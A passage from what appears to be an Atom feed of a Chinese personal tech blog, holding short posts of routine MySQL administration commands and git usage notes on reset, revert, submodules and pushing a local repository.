class="keyword">select</span>  <span class="built_in">min</span>(id) <span class="keyword">as</span> id <span class="keyword">from</span> netnews.item <span class="keyword">group</span> <span class="keyword">by</span> channel_id, link</span><br><span class="line">     ) <span class="keyword">as</span> tab</span><br><span class="line">);</span><br><span class="line"><span class="keyword">set</span> sql_safe_updates<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="安全更新状态修改"><a href="#安全更新状态修改" class="headerlink" title="安全更新状态修改"></a>安全更新状态修改</h2><p>关闭：set sql_safe_updates=0;<br>打开：set sql_safe_updates=1;</p><h2 id="查看mysql系统状态"><a href="#查看mysql系统状态" class="headerlink" title="查看mysql系统状态"></a>查看mysql系统状态</h2><p>show status<br>show processlist</p><h2 id="临时修改内容显示字符集"><a href="#临时修改内容显示字符集" class="headerlink" title="临时修改内容显示字符集"></a>临时修改内容显示字符集</h2><p>charset utf8</p><h2 id="修改索引"><a href="#修改索引" class="headerlink" title="修改索引"></a>修改索引</h2><p>ALTER TABLE <code>babel_idea</code>.<code>i_product_owner</code><br>DROP INDEX <code>name_UNIQUE</code> ,<br>ADD UNIQUE INDEX <code>unique_product_owner_name</code> (<code>name</code> ASC);</p><h2 id="显示索引"><a href="#显示索引" class="headerlink" title="显示索引"></a>显示索引</h2><p>show index from i_product;</p><h2 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h2><p>alter table i_product drop index fk_product_deleted_idx;</p><h2 id="按条件导出mysql表数据"><a href="#按条件导出mysql表数据" class="headerlink" title="按条件导出mysql表数据"></a>按条件导出mysql表数据</h2><p><code>mysqldump -u root -p 数据库名 --no-create-db=TRUE --no-create-info=TRUE --add-drop-table=FALSE --where=&quot;id &gt;1000&quot; 表明&gt;导出文件名.sql</code></p><h2 id="mysqldump数据导入"><a href="#mysqldump数据导入" class="headerlink" title="mysqldump数据导入"></a>mysqldump数据导入</h2><p>mysqldump babel_idea &lt; babel_idea.sql</p><h2 id="启用safe-mode-update-delete-select操作需要包含主键的where条件"><a href="#启用safe-mode-update-delete-select操作需要包含主键的where条件" class="headerlink" title="启用safe mode(update, delete, select操作需要包含主键的where条件)"></a>启用safe mode(update, delete, select操作需要包含主键的where条件)</h2><p>set sql_safe_updates=1;</p><h2 id="关闭safe-mode"><a href="#关闭safe-mode" class="headerlink" title="关闭safe mode"></a>关闭safe mode</h2><p>set sql_safe_updates=0;</p><h2 id="修改表字段"><a href="#修改表字段" class="headerlink" title="修改表字段"></a>修改表字段</h2><p>alter table i_product<br>add column <code>deleted</code> tinyint not null<br>default 0<br>comment ‘逻辑删除，是否已删除(0: 未删除，1: 删除)’;</p><h2 id="添加索引"><a href="#添加索引" class="headerlink" title="添加索引"></a>添加索引</h2><h3 id="添加单一索引"><a href="#添加单一索引" class="headerlink" title="添加单一索引"></a>添加单一索引</h3><p>alter table i_product<br>drop index <code>fk_product_product_idx</code>;</p><h3 id="添加联合索引"><a href="#添加联合索引" class="headerlink" title="添加联合索引"></a>添加联合索引</h3><p>alter table i_product<br>add index <code>fk_product_id_parent_idx</code><br>(id, parent);</p><h2 id="创建数据库-设置默认字符集"><a href="#创建数据库-设置默认字符集" class="headerlink" title="创建数据库(设置默认字符集)"></a>创建数据库(设置默认字符集)</h2><p>create database <code>babel_idea</code> DEFAULT CHARACTER SET utf8;</p><h2 id="只导出数据库数据表结构"><a href="#只导出数据库数据表结构" class="headerlink" title="只导出数据库数据表结构"></a>只导出数据库数据表结构</h2><p>~/local/mysql/bin/mysqldump -ubkmadmin -pbkmadmin -t babel_idea &gt; ~/babel_idea.schema.sql</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/mysql.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;查看innodb引擎状态&quot;&gt;&lt;a href=&quot;#查看innodb引擎状态&quot; class=&quot;headerlink&quot; title=&quot;查看innodb引擎状态&quot;&gt;&lt;/a&gt;查看innodb引擎状态&lt;/h2&gt;&lt;p&gt;可用于查看死锁情况：&lt;br&gt;show engine innodb status;&lt;/p&gt;
&lt;h2 id=&quot;查看锁情况&quot;&gt;&lt;a href=&quot;#查看锁情况&quot; class=&quot;headerlink&quot; title=&quot;查看锁情况&quot;&gt;&lt;/a&gt;查看锁情况&lt;/h2&gt;&lt;p&gt;表锁：show global status like ‘table_locks%’;&lt;br&gt;行锁：show global status like ‘innodb_row_lock%’;&lt;/p&gt;
&lt;h2 id=&quot;文件打开数&quot;&gt;&lt;a href=&quot;#文件打开数&quot; class=&quot;headerlink&quot; title=&quot;文件打开数&quot;&gt;&lt;/a&gt;文件打开数&lt;/h2&gt;&lt;p&gt;show global status like ‘open_files’;&lt;/p&gt;
&lt;h2 id=&quot;查看慢查询&quot;&gt;&lt;a href=&quot;#查看慢查询&quot; class=&quot;headerlink&quot; title=&quot;查看慢查询&quot;&gt;&lt;/a&gt;查看慢查询&lt;/h2&gt;&lt;p&gt;show full processlist;&lt;br&gt;SELECT * FROM information_schema.INNODB_TRX;&lt;br&gt;select @@autocommit;&lt;/p&gt;
&lt;h2 id=&quot;设置对应的编码&quot;&gt;&lt;a href=&quot;#设置对应的编码&quot; class=&quot;headerlink&quot; title=&quot;设置对应的编码&quot;&gt;&lt;/a&gt;设置对应的编码&lt;/h2&gt;&lt;p&gt;set character_set_server=utf8;&lt;/p&gt;
&lt;h2 id=&quot;查看数据库编码&quot;&gt;&lt;a href=&quot;#查看数据库编码&quot; class=&quot;headerlink&quot; title=&quot;查看数据库编码&quot;&gt;&lt;/a&gt;查看数据库编码&lt;/h2&gt;&lt;p&gt;SHOW VARIABLES LIKE ‘character%’;&lt;/p&gt;</summary>
    
    
    
    <category term="数据存储" scheme="http://yeshaoting.cn/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/"/>
    
    
    <category term="mysql" scheme="http://yeshaoting.cn/tags/mysql/"/>
    
    <category term="小记" scheme="http://yeshaoting.cn/tags/%E5%B0%8F%E8%AE%B0/"/>
    
    <category term="命令" scheme="http://yeshaoting.cn/tags/%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>git命令小记</title>
    <link href="http://yeshaoting.cn/article/git/git%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/"/>
    <id>http://yeshaoting.cn/article/git/git%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/git.png" class="img-logo img-center" /><h2 id="1-git日志格式化"><a href="#1-git日志格式化" class="headerlink" title="1. git日志格式化"></a>1. git日志格式化</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git whatchanged -1 --pretty=raw --no-abbrev</span><br><span class="line">git log -1 --pretty=format:&#x27;commit %H%ntree %T%nparent %P%nauthor %an &lt;%ae&gt; %at %ar%ncommitter %cn &lt;%ce&gt; %ct %cr%n%n %s%n%n&#x27;</span><br></pre></td></tr></table></figure><h2 id="2-标签按时间排序"><a href="#2-标签按时间排序" class="headerlink" title="2. 标签按时间排序"></a>2. 标签按时间排序</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">子模块最新的tag: git submodule foreach &#x27;git tag | xargs -I@ git log --format=format:&quot;%ci %H @%n&quot; -1 @ | sort -r | head -1&#x27;</span><br><span class="line">git tag | xargs -I@ git log --format=format:&quot;%ci %h @%n&quot; -1 @ | sort</span><br><span class="line">git tag | xargs -I@ git log --format=format:&quot;%ci %h @%n&quot; -1 @ | sort -r</span><br></pre></td></tr></table></figure><h2 id="3-重置本地代码"><a href="#3-重置本地代码" class="headerlink" title="3. 重置本地代码"></a>3. 重置本地代码</h2><p><code>git reset --mixed</code>：此为默认方式，不带任何参数的git reset，即时这种方式，它回退到某个版本，只保留源码，回退commit和index信息<br><code>git reset --soft</code>：回退到某个版本，只回退了commit的信息，不会恢复到index file一级。如果还要提交，直接commit即可<br><code>git reset --hard</code>：彻底回退到某个版本，本地的源码也会变为上一个版本的内容</p><h2 id="4-创建分支"><a href="#4-创建分支" class="headerlink" title="4. 创建分支"></a>4. 创建分支</h2><p>git branch develop</p><h2 id="5-切换分支"><a href="#5-切换分支" class="headerlink" title="5. 切换分支"></a>5. 切换分支</h2><p>git checkout develop</p><span id="more"></span><h2 id="6-查看分支版本"><a href="#6-查看分支版本" class="headerlink" title="6. 查看分支版本"></a>6. 查看分支版本</h2><p>git branch<br>git branch -v<br>git branch -r</p><h2 id="7-项目多模块更新"><a href="#7-项目多模块更新" class="headerlink" title="7. 项目多模块更新"></a>7. 项目多模块更新</h2><p>git submodule init<br>git submodule update<br>git submodule status</p><h2 id="8-修改最近一次提交"><a href="#8-修改最近一次提交" class="headerlink" title="8. 修改最近一次提交"></a>8. 修改最近一次提交</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &#x27;initial commit&#x27;</span><br><span class="line">git add forgotten_file</span><br><span class="line">git commit --amend</span><br></pre></td></tr></table></figure><h2 id="9-git-ssh配置"><a href="#9-git-ssh配置" class="headerlink" title="9. git ssh配置"></a>9. git ssh配置</h2><p>密钥&amp;公钥对生成(默认生成位置为：~/.ssh)：<br>ssh-keygen -t rsa -C “<a href="mailto:&#x79;&#101;&#x73;&#104;&#x61;&#x6f;&#x74;&#105;&#110;&#103;&#x40;&#49;&#54;&#x33;&#46;&#99;&#x6f;&#109;">&#x79;&#101;&#x73;&#104;&#x61;&#x6f;&#x74;&#105;&#110;&#103;&#x40;&#49;&#54;&#x33;&#46;&#99;&#x6f;&#109;</a>“</p><p><strong>说明</strong>：<br>id_rsa是密钥，如同个人密码一般，别人拿到这个就能以你的身份登录git。<br>id_rsa.pub是公钥，用于在服务器端注册。当访问远程服务器时，远程服务器会拿着他那端的公钥与本机的密钥匹配，成功即可无密码访问。</p><p>测试命令：</p><blockquote><p>git -T User@Host</p></blockquote><h3 id="git配置优先顺序"><a href="#git配置优先顺序" class="headerlink" title="git配置优先顺序"></a>git配置优先顺序</h3><p>local &gt; global &gt; system<br>local：项目目录/.git/config<br>global：当前用户目录/.gitconfig<br>system：/etc/gitconfig</p><h2 id="10-配置值获取"><a href="#10-配置值获取" class="headerlink" title="10.配置值获取"></a>10.配置值获取</h2><p>config demo：<br>[user]<br>        name = shaotingye<br>        email = <a href="mailto:&#x73;&#104;&#x61;&#111;&#116;&#105;&#x6e;&#x67;&#x79;&#101;&#x40;&#115;&#111;&#x68;&#x75;&#45;&#105;&#110;&#99;&#46;&#99;&#111;&#x6d;">&#x73;&#104;&#x61;&#111;&#116;&#105;&#x6e;&#x67;&#x79;&#101;&#x40;&#115;&#111;&#x68;&#x75;&#45;&#105;&#110;&#99;&#46;&#99;&#111;&#x6d;</a></p><p>获取命令为：</p><blockquote><p>git config –get user.email</p></blockquote><h2 id="11-git-放弃本地修改-强制更新"><a href="#11-git-放弃本地修改-强制更新" class="headerlink" title="11. git 放弃本地修改 强制更新"></a>11. git 放弃本地修改 强制更新</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git fetch --all</span><br><span class="line">git reset --hard origin/master</span><br></pre></td></tr></table></figure><p>参考：<a href="http://blog.csdn.net/a06062125/article/details/11727273">http://blog.csdn.net/a06062125/article/details/11727273</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/git.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;1-git日志格式化&quot;&gt;&lt;a href=&quot;#1-git日志格式化&quot; class=&quot;headerlink&quot; title=&quot;1. git日志格式化&quot;&gt;&lt;/a&gt;1. git日志格式化&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git whatchanged -1 --pretty=raw --no-abbrev&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git log -1 --pretty=format:&amp;#x27;commit %H%ntree %T%nparent %P%nauthor %an &amp;lt;%ae&amp;gt; %at %ar%ncommitter %cn &amp;lt;%ce&amp;gt; %ct %cr%n%n %s%n%n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h2 id=&quot;2-标签按时间排序&quot;&gt;&lt;a href=&quot;#2-标签按时间排序&quot; class=&quot;headerlink&quot; title=&quot;2. 标签按时间排序&quot;&gt;&lt;/a&gt;2. 标签按时间排序&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;子模块最新的tag: git submodule foreach &amp;#x27;git tag | xargs -I@ git log --format=format:&amp;quot;%ci %H @%n&amp;quot; -1 @ | sort -r | head -1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git tag | xargs -I@ git log --format=format:&amp;quot;%ci %h @%n&amp;quot; -1 @ | sort&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git tag | xargs -I@ git log --format=format:&amp;quot;%ci %h @%n&amp;quot; -1 @ | sort -r&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h2 id=&quot;3-重置本地代码&quot;&gt;&lt;a href=&quot;#3-重置本地代码&quot; class=&quot;headerlink&quot; title=&quot;3. 重置本地代码&quot;&gt;&lt;/a&gt;3. 重置本地代码&lt;/h2&gt;&lt;p&gt;&lt;code&gt;git reset --mixed&lt;/code&gt;：此为默认方式，不带任何参数的git reset，即时这种方式，它回退到某个版本，只保留源码，回退commit和index信息&lt;br&gt;&lt;code&gt;git reset --soft&lt;/code&gt;：回退到某个版本，只回退了commit的信息，不会恢复到index file一级。如果还要提交，直接commit即可&lt;br&gt;&lt;code&gt;git reset --hard&lt;/code&gt;：彻底回退到某个版本，本地的源码也会变为上一个版本的内容&lt;/p&gt;
&lt;h2 id=&quot;4-创建分支&quot;&gt;&lt;a href=&quot;#4-创建分支&quot; class=&quot;headerlink&quot; title=&quot;4. 创建分支&quot;&gt;&lt;/a&gt;4. 创建分支&lt;/h2&gt;&lt;p&gt;git branch develop&lt;/p&gt;
&lt;h2 id=&quot;5-切换分支&quot;&gt;&lt;a href=&quot;#5-切换分支&quot; class=&quot;headerlink&quot; title=&quot;5. 切换分支&quot;&gt;&lt;/a&gt;5. 切换分支&lt;/h2&gt;&lt;p&gt;git checkout develop&lt;/p&gt;</summary>
    
    
    
    <category term="版本控制" scheme="http://yeshaoting.cn/categories/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"/>
    
    
    <category term="小记" scheme="http://yeshaoting.cn/tags/%E5%B0%8F%E8%AE%B0/"/>
    
    <category term="命令" scheme="http://yeshaoting.cn/tags/%E5%91%BD%E4%BB%A4/"/>
    
    <category term="git" scheme="http://yeshaoting.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>git拉取submodule</title>
    <link href="http://yeshaoting.cn/article/git/git%E6%8B%89%E5%8F%96submodule/"/>
    <id>http://yeshaoting.cn/article/git/git%E6%8B%89%E5%8F%96submodule/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/git.png" class="img-logo img-center" /><h2 id="一、执行步骤"><a href="#一、执行步骤" class="headerlink" title="一、执行步骤"></a>一、执行步骤</h2><h3 id="1-添加子模块配置"><a href="#1-添加子模块配置" class="headerlink" title="1. 添加子模块配置"></a>1. 添加子模块配置</h3><p>子模块的URL加入到.git/config<br>git submodule init</p><h3 id="2-查看模块状态"><a href="#2-查看模块状态" class="headerlink" title="2. 查看模块状态"></a>2. 查看模块状态</h3><p>git submodule status</p><h3 id="3-拉取子模块"><a href="#3-拉取子模块" class="headerlink" title="3. 拉取子模块"></a>3. 拉取子模块</h3><p>克隆子模块的仓库和签出父项目中指定的那个版本<br>git submodule update</p><h3 id="4-切换子模块版本"><a href="#4-切换子模块版本" class="headerlink" title="4. 切换子模块版本"></a>4. 切换子模块版本</h3><p>git submodule foreach git checkout develop</p><h2 id="二、参考文档"><a href="#二、参考文档" class="headerlink" title="二、参考文档"></a>二、参考文档</h2><p><a href="http://gitbook.liuhui998.com/5_10.html">Git Community Book 中文版 - 子模块</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/git.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、执行步骤&quot;&gt;&lt;a href=&quot;#一、执行步骤&quot; class=&quot;headerlink&quot; title=&quot;一、执行步骤&quot;</summary>
      
    
    
    
    <category term="版本控制" scheme="http://yeshaoting.cn/categories/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"/>
    
    
    <category term="git" scheme="http://yeshaoting.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>回滚git代码版本</title>
    <link href="http://yeshaoting.cn/article/git/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8git%E5%9B%9E%E9%80%80%E9%83%A8%E5%88%86%E4%BF%AE%E6%94%B9/"/>
    <id>http://yeshaoting.cn/article/git/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8git%E5%9B%9E%E9%80%80%E9%83%A8%E5%88%86%E4%BF%AE%E6%94%B9/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/git.png" class="img-logo img-center" /><p><strong>参考</strong>：<a href="http://gitbook.liuhui998.com/4_9.html">Git的撤消操作 - 重置, 签出 和 撤消</a></p><p>错提交代码，或者某个版本代码之后想要回滚回来的话，就会遇到需要回滚代码版本的问题。</p><p>根据代码当前提交状态，回滚操作可以分为二类：</p><ol><li>未提交代码</li><li>已提交代码</li></ol><h2 id="一、回滚未提交代码"><a href="#一、回滚未提交代码" class="headerlink" title="一、回滚未提交代码"></a>一、回滚未提交代码</h2><p><a href="http://blog.csdn.net/wujiangguizhen/article/details/10609647">git reset三种方式</a>：</p><ol><li><p>只回滚本地代码库(HEAD)内容，不回滚索引(index)和工作区(working)内容。<br><code>git reset --soft 版本号</code></p></li><li><p>(<strong>默认</strong>)只回滚本地代码库(HEAD)和索引(index)内容，不回滚工作区(working)内容。<br><code>git reset --mixed 版本号</code></p></li><li><p>回滚本地代码库(HEAD)、索引(index)和工作区(working)内容。<br><code>git reset --hard 版本号</code></p></li></ol><span id="more"></span><p><strong>常用命令</strong></p><ol><li><p>回滚到上一个版本<br><code>git reset HEAD</code></p></li><li><p>回滚到上上个版本<br><code>git reset HEAD^</code></p></li><li><p>回滚到指定版本<br><code>git reset 057d</code></p></li></ol><p><strong>注</strong>：此处回滚的含义是与当前分支远程代码库(target)内容保持一致。</p><h3 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h3><p><strong>参考</strong>：<a href="https://git-scm.com/docs/git-reset">git-reset</a></p><h4 id="举例1"><a href="#举例1" class="headerlink" title="举例1"></a>举例1</h4><table><thead><tr><th>#</th><th>working</th><th>index</th><th>HEAD</th><th>target</th></tr></thead><tbody><tr><td>current</td><td>A</td><td>B</td><td>C</td><td>D</td></tr><tr><td>soft</td><td>A</td><td>B</td><td>D</td><td>D</td></tr><tr><td>mixed</td><td>A</td><td>D</td><td>D</td><td>D</td></tr><tr><td>hard</td><td>D</td><td>D</td><td>D</td><td>D</td></tr></tbody></table><h4 id="举例2"><a href="#举例2" class="headerlink" title="举例2"></a>举例2</h4><table><thead><tr><th>#</th><th>working</th><th>index</th><th>HEAD</th><th>target</th></tr></thead><tbody><tr><td>current</td><td>A</td><td>B</td><td>C</td><td>C</td></tr><tr><td>soft</td><td>A</td><td>B</td><td>C</td><td>C</td></tr><tr><td>mixed</td><td>A</td><td>C</td><td>C</td><td>C</td></tr><tr><td>hard</td><td>C</td><td>C</td><td>C</td><td>C</td></tr></tbody></table><h2 id="二、回滚已提交代码"><a href="#二、回滚已提交代码" class="headerlink" title="二、回滚已提交代码"></a>二、回滚已提交代码</h2><h3 id="1-回滚已经提交，且已发布代码"><a href="#1-回滚已经提交，且已发布代码" class="headerlink" title="1. 回滚已经提交，且已发布代码"></a>1. 回滚已经提交，且已发布代码</h3><p>参考：<a href="http://blog.chinaunix.net/uid-26770731-id-3285880.html">git revert 用法</a></p><p>git revert撤销某次操作，此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交。<br>git revert是提交一个新的版本，将需要revert的版本的内容再反向修改回去，版本会递增，不影响之前提交的内容。</p><p><strong>常用命令</strong></p><ol><li><p>撤销前一次 commit<br><code>git revert HEAD</code></p></li><li><p>撤销前前一次 commit<br><code>git revert HEAD^</code></p></li><li><p>撤销指定的版本，撤销也会作为一次提交进行保存<br><code>git revert commit fa042ce57ebbe5bb9c8db709f719cec2c58ee7ff</code></p></li></ol><h4 id="举例说明-1"><a href="#举例说明-1" class="headerlink" title="举例说明"></a>举例说明</h4><p>代码版本库中间一段提交内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">commit c15ebaadf86bde882035a68e09f0b7832ea271f6</span><br><span class="line">    删除无用文件</span><br><span class="line"></span><br><span class="line">commit 763ab06edb1b5054fbd12e94317e2f13ac4b2af5</span><br><span class="line">    修改静态资源版本</span><br><span class="line"></span><br><span class="line">commit 277563b24904f3f70eb210f6fa1d3f3f1ee914ac</span><br><span class="line">    pvrs接口切回测试环境</span><br><span class="line"></span><br><span class="line">commit a00d98c53e86182054eb4e77a18e3044f5f9d658</span><br><span class="line">    搜索无数据返回，导致空指针异常处理</span><br></pre></td></tr></table></figure><p>如果期望代码回滚到 <strong>277563b24904f3f70eb210f6fa1d3f3f1ee914ac</strong> 这个状态的话，则需要撤销后一个版本 <strong>763ab06edb1b5054fbd12e94317e2f13ac4b2af5</strong> 以后的所有代码提交。<br>执行命令：<code>git revert 763ab06edb1b5054fbd12e94317e2f13ac4b2af5</code></p><h3 id="2-回滚已经提交，但未发布代码"><a href="#2-回滚已经提交，但未发布代码" class="headerlink" title="2. 回滚已经提交，但未发布代码"></a>2. 回滚已经提交，但未发布代码</h3><p><strong>参考</strong>：<a href="https://git-scm.com/book/zh/v1/Git-%E5%9F%BA%E7%A1%80-%E6%92%A4%E6%B6%88%E6%93%8D%E4%BD%9C">Git 基础 - 撤消操作</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &#x27;initial commit&#x27;</span><br><span class="line">git add forgotten_file</span><br><span class="line">git commit --amend</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/git.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;&lt;strong&gt;参考&lt;/strong&gt;：&lt;a href=&quot;http://gitbook.liuhui998.com/4_9.html&quot;&gt;Git的撤消操作 - 重置, 签出 和 撤消&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;错提交代码，或者某个版本代码之后想要回滚回来的话，就会遇到需要回滚代码版本的问题。&lt;/p&gt;
&lt;p&gt;根据代码当前提交状态，回滚操作可以分为二类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;未提交代码&lt;/li&gt;
&lt;li&gt;已提交代码&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;一、回滚未提交代码&quot;&gt;&lt;a href=&quot;#一、回滚未提交代码&quot; class=&quot;headerlink&quot; title=&quot;一、回滚未提交代码&quot;&gt;&lt;/a&gt;一、回滚未提交代码&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/wujiangguizhen/article/details/10609647&quot;&gt;git reset三种方式&lt;/a&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;只回滚本地代码库(HEAD)内容，不回滚索引(index)和工作区(working)内容。&lt;br&gt;&lt;code&gt;git reset --soft 版本号&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;(&lt;strong&gt;默认&lt;/strong&gt;)只回滚本地代码库(HEAD)和索引(index)内容，不回滚工作区(working)内容。&lt;br&gt;&lt;code&gt;git reset --mixed 版本号&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;回滚本地代码库(HEAD)、索引(index)和工作区(working)内容。&lt;br&gt;&lt;code&gt;git reset --hard 版本号&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="版本控制" scheme="http://yeshaoting.cn/categories/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"/>
    
    
    <category term="git" scheme="http://yeshaoting.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>推送本地git仓库</title>
    <link href="http://yeshaoting.cn/article/git/%E6%8E%A8%E9%80%81%E6%9C%AC%E5%9C%B0git%E4%BB%93%E5%BA%93/"/>
    <id>http://yeshaoting.cn/article/git/%E6%8E%A8%E9%80%81%E6%9C%AC%E5%9C%B0git%E4%BB%93%E5%BA%93/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/git.png" class="img-logo img-center" /><p>本文参考：<a href="https://www.texniq.de/en/web-engineering-i/create-local-git-repo-and-push-to-github">Create Local Git Repo &amp; Push to GitHub</a></p><h2 id="一、打开终端"><a href="#一、打开终端" class="headerlink" title="一、打开终端"></a>一、打开终端</h2><h2 id="二、到本地文件目录"><a href="#二、到本地文件目录" class="headerlink" title="二、到本地文件目录"></a>二、到本地文件目录</h2><blockquote><p>cd /home/developer/public_html</p></blockquote><h2 id="三、配置git"><a href="#三、配置git" class="headerlink" title="三、配置git"></a>三、配置git</h2><p>用户名：<br><code>git config --global user.name &quot;叶绍亭&quot;</code></p><p>邮箱：<br><code>git config --global user.email &quot;yeshaoting@163.com&quot;</code></p><p>配色方案：<br><code>git config --global color.ui auto</code></p><h2 id="四、-项目初始化"><a href="#四、-项目初始化" class="headerlink" title="四、 项目初始化"></a>四、 项目初始化</h2><p><code>git init</code></p><p>初始化成功会看到如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Initialized empty Git repository in home/developer/public_html/.git&quot;</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="五、验证初始化后的状态"><a href="#五、验证初始化后的状态" class="headerlink" title="五、验证初始化后的状态"></a>五、验证初始化后的状态</h2><p><code>git status</code></p><p>应该能看到类似如下的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> On branch master</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Initial commit</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Untracked files:</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   (use <span class="string">&quot;git add &lt;file&gt;...&quot;</span> to include <span class="keyword">in</span> what will be committed)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment">#   .project</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   bootstrap/</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   index.html</span></span><br><span class="line">nothing added to commit but untracked files present (use &quot;git add&quot; to track)</span><br></pre></td></tr></table></figure><h2 id="六、添加文件或者目录到索引-index"><a href="#六、添加文件或者目录到索引-index" class="headerlink" title="六、添加文件或者目录到索引(index)"></a>六、添加文件或者目录到索引(index)</h2><p><code>git add *</code></p><p>应该能看到类似如下的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 